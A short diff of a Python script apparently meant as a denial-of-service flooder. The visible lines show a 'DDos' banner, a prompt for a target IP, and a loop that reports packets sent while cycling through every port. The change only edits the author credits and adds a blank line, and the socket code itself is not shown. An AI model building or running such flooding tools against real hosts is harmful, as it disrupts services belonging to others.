@@ -21,9 +21,9 @@ os.system("clear")
 #display banner
 os.system("figlet DDos")
 print()
-print("Author :- MD. Abdul Hannan Mir")
-print("Github :- hannan0x0")
-print("Page   :- Cyberdemy Bangladesh")
+print("Author :- Hannan Mir")
+print("Github :- bunnyx404")
+print("Page   :- Cyberdemy")
 print()
 
 ip = input("Enter Your Target IP: ")
@@ -63,4 +63,5 @@ while True:
     port = port + 1  
     print("sent %s packet to %s sent port:%s" % (sent, ip, port))
     if port == 65534:
+
         port = 1
